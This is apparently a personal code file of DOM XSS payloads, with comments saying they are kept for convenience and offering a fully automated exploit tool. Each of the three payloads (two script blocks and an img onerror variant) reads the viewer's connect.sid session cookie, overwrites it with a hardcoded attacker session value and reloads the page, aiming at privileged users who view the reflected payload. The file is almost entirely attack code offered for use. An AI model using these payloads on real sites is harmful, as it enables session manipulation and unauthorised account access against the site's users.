// // Here are some DOM XSS Payloads I created that take in your own cookie, and then replaces 
// // a privliged user's cookie and refreshes the page which if unprotected will make your account
// // privliged with whatever user views the reflected XSS

// // this is just a list for myself for convinence 
// // if someone would like a fully automated script that does this
// // as well as my other payloads all for you lmk :)
// // something like: UI with payloads and customization, finds potential for vuln, server set up, and auto exploit,
// // maybe even create auto report about what the vuln was.. how it was attacked.. how to protect??



// <script>
// // Replace "yourCookieValue" with the value of your own cookie
// var yourCookieValue = "s%3A9F1ULGKepxClQcAa5p9Xl-rHPGHOL8De.l8hC%2Bgj8B6YT3PQ5w18SFrzuy%2BW7yUPizZ2Qa7StElE";

// // Store the admin's cookie value in a variable
// var adminCookie = document.cookie.match(/connect.sid([^;]+)/)[1];

// // Set the admin's cookie to your cookie value
// document.cookie = "connect.sid=" + yourCookieValue;

// // Refresh the page to apply the new cookie value
// window.location.reload();
// </script>


// --------------
// var adminCookie = document.cookie.match(/connect.sid([^;]+)/)[1];
{/* <script>
var myCookieValue = "s%3A9F1ULGKepxClQcAa5p9Xl-rHPGHOL8De.l8hC%2Bgj8B6YT3PQ5w18SFrzuy%2BW7yUPizZ2Qa7StElE";
var adminCookie = document.cookie.match(/connect\.sid=([^;]+)/)[1];

if (adminCookie !== myCookieValue) {
  document.cookie = "connect.sid=" + myCookieValue;
  window.location.reload();
}
</script> */}

// change the payload to be img tags
{/* <img src="" onerror="var myCookieValue = 's%3A9F1ULGKepxClQcAa5p9Xl-rHPGHOL8De.l8hC%2Bgj8B6YT3PQ5w18SFrzuy%2BW7yUPizZ2Qa7StElE'; var adminCookie = document.cookie.match(/connect\.sid=([^;]+)/)[1]; if (adminCookie !== myCookieValue) { document.cookie = 'connect.sid=' + myCookieValue; window.location.reload(); }" */}